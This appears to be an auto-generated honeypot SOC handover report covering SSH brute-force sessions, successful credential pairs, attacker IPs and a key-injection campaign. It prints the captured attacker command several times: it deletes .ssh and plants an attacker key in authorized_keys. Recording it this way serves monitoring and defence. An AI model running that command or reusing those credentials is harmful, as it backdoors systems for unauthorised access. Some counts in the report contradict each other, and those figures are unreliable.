# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-26 |
| **Generated At** | 2026-03-26T19:02:50Z |
| **Shift Time** | 19:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **148** |
| Confirmed Threats | **126** |
| False Positives Filtered | **22** (14.9%) |
| Unique Attacker IPs | **48** |
| Countries of Origin | **23** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **137** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **62** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **30** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 4 |
| `config` | 4 |
| `teamcity` | 3 |
| `user2` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `123456` | 5 |
| `345gs5662d34` | 4 |
| `teamcity123` | 3 |
| `user21234` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `teamcity` | `teamcity123` | 3 |
| `user2` | `user21234` | 3 |
| `vintagestory` | `Vintagestory123!` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `aaaaaa` | `112.219.151.50` | 2026-03-26T17:13:23 |
| `root` | `3245gs5662d34` | `112.219.151.50` | 2026-03-26T17:13:26 |
| `root` | `aaaaaa` | `179.48.54.162` | 2026-03-26T17:18:39 |
| `root` | `3245gs5662d34` | `179.48.54.162` | 2026-03-26T17:18:48 |
| `root` | `Ab123456+` | `172.178.16.179` | 2026-03-26T17:23:47 |
| `root` | `3245gs5662d34` | `172.178.16.179` | 2026-03-26T17:24:07 |
| `root` | `1111111` | `65.20.250.180` | 2026-03-26T18:23:45 |
| `root` | `suna` | `168.96.252.158` | 2026-03-26T18:56:42 |
| `root` | `3245gs5662d34` | `168.96.252.158` | 2026-03-26T18:56:51 |
| `root` | `qwaszx@123` | `118.99.102.20` | 2026-03-26T18:57:27 |
| `root` | `3245gs5662d34` | `118.99.102.20` | 2026-03-26T18:57:31 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.219.151.50`, `118.99.102.20`, `168.96.252.158`, `179.48.54.162`, `172.178.16.179`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **48** |
| Unique ASNs | **43** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | LOW |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | MEDIUM |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |
| `AS16735` | ALGAR TELECOM S/A | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8daeaca14071

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-03-26 17:13 |
| **Last Seen** | 2026-03-26 17:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 17:13:22` | `cowrie.session.connect` |
| `2026-03-26 17:13:22` | `cowrie.client.version` |
| `2026-03-26 17:13:22` | `cowrie.client.kex` |
| `2026-03-26 17:13:23` | `cowrie.login.success` |
| `2026-03-26 17:13:23` | `cowrie.session.params` |
| `2026-03-26 17:13:23` | `cowrie.command.input` |
| `2026-03-26 17:13:23` | `cowrie.command.failed` |
| `2026-03-26 17:13:23` | `cowrie.log.closed` |
| `2026-03-26 17:13:23` | `cowrie.session.params` |
| `2026-03-26 17:13:23` | `cowrie.command.input` |
| `2026-03-26 17:13:24` | `cowrie.session.file_download` |
| `2026-03-26 17:13:24` | `cowrie.log.closed` |
| `2026-03-26 17:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e9a1983c63

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-03-26 17:13 |
| **Last Seen** | 2026-03-26 17:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 17:13:26` | `cowrie.session.connect` |
| `2026-03-26 17:13:26` | `cowrie.client.version` |
| `2026-03-26 17:13:26` | `cowrie.client.kex` |
| `2026-03-26 17:13:26` | `cowrie.login.success` |
| `2026-03-26 17:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff35ae20296

| Field | Detail |
|---|---|
| **Source IP** | `179.48.54[.]162` |
| **First Seen** | 2026-03-26 17:18 |
| **Last Seen** | 2026-03-26 17:18 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 17:18:37` | `cowrie.session.connect` |
| `2026-03-26 17:18:37` | `cowrie.client.version` |
| `2026-03-26 17:18:38` | `cowrie.client.kex` |
| `2026-03-26 17:18:39` | `cowrie.login.success` |
| `2026-03-26 17:18:40` | `cowrie.session.params` |
| `2026-03-26 17:18:40` | `cowrie.command.input` |
| `2026-03-26 17:18:40` | `cowrie.command.failed` |
| `2026-03-26 17:18:41` | `cowrie.log.closed` |
| `2026-03-26 17:18:41` | `cowrie.session.params` |
| `2026-03-26 17:18:41` | `cowrie.command.input` |
| `2026-03-26 17:18:42` | `cowrie.session.file_download` |
| `2026-03-26 17:18:42` | `cowrie.log.closed` |
| `2026-03-26 17:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.48.54[.]162` to AbuseIPDB if not already reported
- [ ] Block `179.48.54[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe946ff79d3

| Field | Detail |
|---|---|
| **Source IP** | `179.48.54[.]162` |
| **First Seen** | 2026-03-26 17:18 |
| **Last Seen** | 2026-03-26 17:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 17:18:46` | `cowrie.session.connect` |
| `2026-03-26 17:18:46` | `cowrie.client.version` |
| `2026-03-26 17:18:47` | `cowrie.client.kex` |
| `2026-03-26 17:18:48` | `cowrie.login.success` |
| `2026-03-26 17:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.48.54[.]162` to AbuseIPDB if not already reported
- [ ] Block `179.48.54[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b24c736f681

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-03-26 17:23 |
| **Last Seen** | 2026-03-26 17:24 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 17:23:38` | `cowrie.session.connect` |
| `2026-03-26 17:23:38` | `cowrie.client.version` |
| `2026-03-26 17:23:38` | `cowrie.client.kex` |
| `2026-03-26 17:23:47` | `cowrie.login.success` |
| `2026-03-26 17:23:48` | `cowrie.session.params` |
| `2026-03-26 17:23:48` | `cowrie.command.input` |
| `2026-03-26 17:23:48` | `cowrie.command.failed` |
| `2026-03-26 17:23:48` | `cowrie.log.closed` |
| `2026-03-26 17:23:49` | `cowrie.session.params` |
| `2026-03-26 17:23:49` | `cowrie.command.input` |
| `2026-03-26 17:23:54` | `cowrie.session.file_download` |
| `2026-03-26 17:23:54` | `cowrie.log.closed` |
| `2026-03-26 17:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a220fe5d4f3

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-03-26 17:24 |
| **Last Seen** | 2026-03-26 17:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 17:24:04` | `cowrie.session.connect` |
| `2026-03-26 17:24:04` | `cowrie.client.version` |
| `2026-03-26 17:24:04` | `cowrie.client.kex` |
| `2026-03-26 17:24:07` | `cowrie.login.success` |
| `2026-03-26 17:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cfb4c05a9ed

| Field | Detail |
|---|---|
| **Source IP** | `65.20.250[.]180` |
| **First Seen** | 2026-03-26 18:23 |
| **Last Seen** | 2026-03-26 18:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 18:23:43` | `cowrie.session.connect` |
| `2026-03-26 18:23:43` | `cowrie.client.version` |
| `2026-03-26 18:23:43` | `cowrie.client.kex` |
| `2026-03-26 18:23:45` | `cowrie.login.success` |
| `2026-03-26 18:23:46` | `cowrie.direct-tcpip.request` |
| `2026-03-26 18:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.250[.]180` to AbuseIPDB if not already reported
- [ ] Block `65.20.250[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78346427baa1

| Field | Detail |
|---|---|
| **Source IP** | `168.96.252[.]158` |
| **First Seen** | 2026-03-26 18:56 |
| **Last Seen** | 2026-03-26 18:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 18:56:39` | `cowrie.session.connect` |
| `2026-03-26 18:56:39` | `cowrie.client.version` |
| `2026-03-26 18:56:41` | `cowrie.client.kex` |
| `2026-03-26 18:56:42` | `cowrie.login.success` |
| `2026-03-26 18:56:43` | `cowrie.session.params` |
| `2026-03-26 18:56:43` | `cowrie.command.input` |
| `2026-03-26 18:56:43` | `cowrie.command.failed` |
| `2026-03-26 18:56:43` | `cowrie.log.closed` |
| `2026-03-26 18:56:44` | `cowrie.session.params` |
| `2026-03-26 18:56:44` | `cowrie.command.input` |
| `2026-03-26 18:56:45` | `cowrie.session.file_download` |
| `2026-03-26 18:56:45` | `cowrie.log.closed` |
| `2026-03-26 18:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.96.252[.]158` to AbuseIPDB if not already reported
- [ ] Block `168.96.252[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87643411aa5c

| Field | Detail |
|---|---|
| **Source IP** | `168.96.252[.]158` |
| **First Seen** | 2026-03-26 18:56 |
| **Last Seen** | 2026-03-26 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 18:56:49` | `cowrie.session.connect` |
| `2026-03-26 18:56:49` | `cowrie.client.version` |
| `2026-03-26 18:56:50` | `cowrie.client.kex` |
| `2026-03-26 18:56:51` | `cowrie.login.success` |
| `2026-03-26 18:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.96.252[.]158` to AbuseIPDB if not already reported
- [ ] Block `168.96.252[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2c0ac926c5

| Field | Detail |
|---|---|
| **Source IP** | `118.99.102[.]20` |
| **First Seen** | 2026-03-26 18:57 |
| **Last Seen** | 2026-03-26 18:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 18:57:26` | `cowrie.session.connect` |
| `2026-03-26 18:57:26` | `cowrie.client.version` |
| `2026-03-26 18:57:27` | `cowrie.client.kex` |
| `2026-03-26 18:57:27` | `cowrie.login.success` |
| `2026-03-26 18:57:28` | `cowrie.session.params` |
| `2026-03-26 18:57:28` | `cowrie.command.input` |
| `2026-03-26 18:57:28` | `cowrie.command.failed` |
| `2026-03-26 18:57:28` | `cowrie.log.closed` |
| `2026-03-26 18:57:28` | `cowrie.session.params` |
| `2026-03-26 18:57:28` | `cowrie.command.input` |
| `2026-03-26 18:57:28` | `cowrie.session.file_download` |
| `2026-03-26 18:57:28` | `cowrie.log.closed` |
| `2026-03-26 18:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.102[.]20` to AbuseIPDB if not already reported
- [ ] Block `118.99.102[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6038cecb044a

| Field | Detail |
|---|---|
| **Source IP** | `118.99.102[.]20` |
| **First Seen** | 2026-03-26 18:57 |
| **Last Seen** | 2026-03-26 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 18:57:31` | `cowrie.session.connect` |
| `2026-03-26 18:57:31` | `cowrie.client.version` |
| `2026-03-26 18:57:31` | `cowrie.client.kex` |
| `2026-03-26 18:57:31` | `cowrie.login.success` |
| `2026-03-26 18:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.102[.]20` to AbuseIPDB if not already reported
- [ ] Block `118.99.102[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.212.40[.]244` | **25** | 2026-03-26 18:04 | 2026-03-26 18:09 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.43[.]0` | **25** | 2026-03-26 17:34 | 2026-03-26 17:40 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `101.52.130[.]122` | **5** | 2026-03-26 17:08 | 2026-03-26 17:16 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.219.151[.]50` | **5** | 2026-03-26 17:06 | 2026-03-26 17:19 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `125.16.27[.]190` | **5** | 2026-03-26 17:11 | 2026-03-26 17:21 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `172.178.16[.]179` | **5** | 2026-03-26 17:05 | 2026-03-26 17:29 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `179.48.54[.]162` | **5** | 2026-03-26 17:10 | 2026-03-26 17:20 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `180.167.207[.]234` | **5** | 2026-03-26 18:52 | 2026-03-26 19:01 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.250[.]38` | **5** | 2026-03-26 17:08 | 2026-03-26 17:11 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.24[.]58` | **4** | 2026-03-26 18:34 | 2026-03-26 18:43 | 8m | 0 | `T1592` | 🟢 LOW |
| `171.244.37[.]103` | **2** | 2026-03-26 17:13 | 2026-03-26 17:16 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `187.72.128[.]177` | **2** | 2026-03-26 17:42 | 2026-03-26 17:47 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.106.56[.]201` | **2** | 2026-03-26 17:47 | 2026-03-26 17:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.90.34[.]90` | 1 | 2026-03-26 17:43 | 2026-03-26 17:45 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.21[.]178` | 1 | 2026-03-26 18:45 | 2026-03-26 18:45 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.140.95[.]2` | 1 | 2026-03-26 18:24 | 2026-03-26 18:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.45.19[.]198` | 1 | 2026-03-26 17:14 | 2026-03-26 17:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.99.102[.]20` | 1 | 2026-03-26 18:57 | 2026-03-26 18:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.23.77[.]27` | 1 | 2026-03-26 18:27 | 2026-03-26 18:27 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-26 18:27 | 2026-03-26 18:27 | 30s | 0 | `T1592` | 🟢 LOW |
| `168.96.252[.]158` | 1 | 2026-03-26 18:56 | 2026-03-26 18:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-03-26 17:43 | 2026-03-26 17:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.153[.]243` | 1 | 2026-03-26 17:02 | 2026-03-26 17:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.215.204[.]109` | 1 | 2026-03-26 17:22 | 2026-03-26 17:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.124.14[.]234` | 1 | 2026-03-26 17:02 | 2026-03-26 17:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `49.124.154[.]153` | 1 | 2026-03-26 18:06 | 2026-03-26 18:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.206.194[.]29` | 1 | 2026-03-26 17:21 | 2026-03-26 17:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.255.201[.]222` | 1 | 2026-03-26 17:36 | 2026-03-26 17:36 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.46.182[.]10` | 1 | 2026-03-26 17:25 | 2026-03-26 17:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.93.36[.]136` | 1 | 2026-03-26 17:05 | 2026-03-26 17:05 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.243.169[.]150` | 1 | 2026-03-26 17:28 | 2026-03-26 17:29 | 12s | 0 | `T1592` | 🟢 LOW |
| `83.239.84[.]130` | 1 | 2026-03-26 18:04 | 2026-03-26 18:04 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.233.194[.]35` | 1 | 2026-03-26 17:15 | 2026-03-26 17:15 | 5s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
